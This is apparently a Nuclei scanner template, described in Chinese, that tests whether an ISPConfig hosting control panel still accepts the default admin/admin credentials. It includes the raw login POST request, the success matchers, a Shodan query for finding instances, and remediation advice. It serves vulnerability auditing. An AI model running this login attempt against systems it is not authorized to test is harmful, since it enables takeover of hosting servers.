id: ispconfig-hcp-default-login

info:
  name: ISPConfig Hosting Control Panel 默认口令登录（弱口令）
  author: ritikchaddha
  severity: high
  description: |
    该模板用于检测 ISPConfig Hosting Control Panel 是否仍可使用默认凭据或弱口令登录。模板主要向 `/content.php` 等认证入口发送请求，使用内置默认凭据组合进行认证尝试，并根据响应中的 `LOGIN_REDIRECT:dashboard/dashboard.php`、`Set-Cookie` 等登录成功特征判断登录是否成功；命中说明目标未及时修改出厂、示例或初始化账号口令。
  impact: |
    - 攻击者可登录 ISPConfig Hosting Control Panel 后台，管理内容、用户、插件、主题、文件或站点配置。
    - 后台权限被滥用后，可能导致页面篡改、恶意文件上传、敏感资料泄露，或进一步取得服务器执行能力。
  remediation: |
    - 立即修改默认管理员凭据，删除安装向导、演示账号和不必要的后台用户。
    - 限制后台登录入口访问来源，启用多因素认证、登录失败锁定和验证码等防护。
    - 检查近期内容、插件、主题、文件上传和管理员操作记录，确认没有持久化后门。
  classification:
    cpe: cpe:2.3:a:ispconfig:ispconfig:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: ispconfig
    product: ispconfig
    shodan-query: title:"ISPConfig" http.favicon.hash:483383992
  tags: ispconfig,hsp,default-login,vuln

http:
  - raw:
      - |
        POST /content.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username={{username}}&passwort={{password}}&s_mod=login&s_pg=index

    attack: pitchfork
    payloads:
      username:
        - admin
      password:
        - admin

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'LOGIN_REDIRECT:dashboard/dashboard.php'

      - type: word
        part: header
        words:
          - 'Set-Cookie'

      - type: status
        status:
          - 200
